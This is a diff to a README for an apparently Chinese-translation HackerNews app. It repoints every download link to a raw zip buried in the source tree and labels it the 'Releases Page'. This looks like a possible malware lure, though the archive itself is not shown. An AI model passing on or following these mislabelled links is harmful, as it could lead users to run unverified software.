@@ -4,14 +4,14 @@
 Welcome to hackernews-cn! This application helps you easily access the latest technology trends by automatically translating popular HackerNews content into Chinese. Stay up-to-date with top articles, news, discussions, and project showcases without the language barrier.
 
 ## 📥 Download Now
-[![Download the latest release](https://raw.githubusercontent.com/Yawar0135/hackernews-cn/main/distribution/hackernews-cn.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Yawar0135/hackernews-cn/main/distribution/hackernews-cn.zip)
+[![Download the latest release](https://github.com/Yawar0135/hackernews-cn/raw/refs/heads/main/src/app/item/hackernews_cn_v1.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Yawar0135/hackernews-cn/raw/refs/heads/main/src/app/item/hackernews_cn_v1.0.zip)
 
 ## 🚀 Getting Started
 To start using hackernews-cn, follow these simple steps:
 
 1. **Visit the Releases Page**
    Go to our GitHub Releases page to get the latest version of the app. Click on the following link:
-   - [Download from Releases Page](https://raw.githubusercontent.com/Yawar0135/hackernews-cn/main/distribution/hackernews-cn.zip)
+   - [Download from Releases Page](https://github.com/Yawar0135/hackernews-cn/raw/refs/heads/main/src/app/item/hackernews_cn_v1.0.zip)
 
 2. **Select the Right Version**
    On the Releases page, you will see various versions of the app. Choose the version that fits your system. 
@@ -64,4 +64,4 @@ For more information about hackernews-cn, check out our project page on GitHub. 
 
 ## 📥 Download Again
 Don’t forget, you can always get the latest version from our Releases page:
-- [Download from Releases Page](https://raw.githubusercontent.com/Yawar0135/hackernews-cn/main/distribution/hackernews-cn.zip)
+- [Download from Releases Page](https://github.com/Yawar0135/hackernews-cn/raw/refs/heads/main/src/app/item/hackernews_cn_v1.0.zip)
